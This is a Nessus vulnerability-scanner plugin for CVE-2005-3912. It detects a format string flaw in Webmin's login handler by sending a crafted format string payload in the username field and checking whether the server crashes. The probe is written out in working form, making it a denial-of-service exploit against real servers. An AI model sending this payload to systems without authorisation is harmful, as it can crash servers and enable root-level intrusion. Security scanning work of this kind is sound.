#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20343);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2016/05/04 18:02:23 $");

  script_cve_id("CVE-2005-3912");
  script_bugtraq_id(15629);
  script_osvdb_id(21222);

  script_name(english:"Webmin 'miniserv.pl' 'username' Parameter Format String");
  script_summary(english:"Checks for username parameter format string vulnerability in Webmin miniserv.pl.");

  script_set_attribute(attribute:"synopsis", value:"The remote web server is affected by a format string vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Webmin installed on the remote host contains a format
string flaw when logging failed authentication attempts. Using
specially crafted values for the 'username' parameter of the
'session_login.cgi', an attacker could exploit the flaw to crash the
affected server or to potentially execute arbitrary code on the
affected host under the privileges of the userid in which the Perl
script 'miniserv.pl' runs. The default is the root user.");
  # http://web.archive.org/web/20070223132112/http://www.dyadsecurity.com/webmin-0001.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ba687296");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/418093/100/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.webmin.com/security.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to Webmin version 1.250 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/11/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/11/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/12/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:webmin:webmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("webmin.nasl");
  script_require_keys("www/webmin");
  script_require_ports("Services/www", 10000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

app = 'Webmin';
port = get_http_port(default:10000, embedded: TRUE);
get_kb_item_or_exit('www/'+port+'/webmin');

dir = "/";
install_url = build_url(port:port, qs:dir);

disable_cookiejar();

# Try to exploit the flaw.
exploit = "%250" + crap(data:"9", length:20) + "d";
postdata =
  "page=/&" +
  "user=" + exploit + "&" +
  "pass=" + SCRIPT_NAME;

r = http_send_recv3(
  port    : port,
  method  : "POST",
  item    : "/session_login.cgi",
  version : 11,
  add_headers : make_array("Content-Type", "application/x-www-form-urlencoded",
 	      		  "Cookie2", 'version="1"',
			  "Cookie", "testing=1" ),
  data    : postdata
);

# There's a problem if MiniServ appears down.
if (isnull(r))
{
  if (http_is_dead(port:port, retry: 3))
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' + 'Nessus was able to exploit this issue with the following request : '+
        '\n' + 
        '\n' + http_last_sent_request() + 
        '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
